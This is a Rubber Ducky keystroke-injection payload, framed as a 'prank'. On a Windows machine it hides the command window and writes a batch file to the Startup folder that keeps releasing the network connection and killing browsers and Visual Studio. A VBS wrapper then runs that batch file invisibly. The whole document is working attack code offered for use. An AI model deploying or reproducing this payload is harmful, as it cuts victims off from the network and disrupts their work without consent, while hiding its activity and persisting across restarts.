REM Still needs some work to get it to start up silently on restart. Is another prank script. 

```
REM Author: overwraith
REM A new DenyNetAccess program that employs window hiding techniques. 
CONTROL ESCAPE
STRING cmd /Q /D /T:7F /F:OFF /V:OFF /K
DELAY 500
ENTER
DELAY 750
ALT SPACE
STRING M
DOWNARROW
REPEAT 100
ENTER
REM A Different directory in case the second one is inaccessable
DELAY 750
STRING cd %userprofile%\Downloads\
ENTER
STRING cd C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\
ENTER
REM Delete batch file if already exists
STRING erase /Q a.bat
ENTER
REM Make the batch file
STRING copy con a.bat
ENTER
STRING @echo off
ENTER
STRING :Start
ENTER
REM Release Networking INformation
STRING ipconfig /release
ENTER
REM 2 Generic Browsers
STRING taskkill /f /im "iexplore.exe"
ENTER
STRING taskkill /f /im "firefox.exe"
ENTER
REM Microsoft Visual Studio 2010
STRING taskkill /f /im "devenv.exe"
ENTER
STRING timeout /t 60
ENTER
STRING Goto Start
ENTER
CONTROL z
ENTER
REM MAKE THE VBS FILE THAT ALLOWS RUNNING INVISIBLY.
REM Delete vbs file if already exists
STRING erase /Q invis.vbs
ENTER
REM FROM: http://stackoverflow.com/questions/289498/running-batch-file-in-background-when-windows-boots-up
STRING copy con invis.vbs
ENTER
STRING CreateObject("Wscript.Shell").Run """" & WScript.Arguments(0) & """", 0, False
ENTER
CONTROL z
ENTER
REM RUN THE BATCH FILE
STRING wscript.exe invis.vbs a.bat
ENTER
REM Close the cmd prompt. 
STRING EXIT
ENTER
```
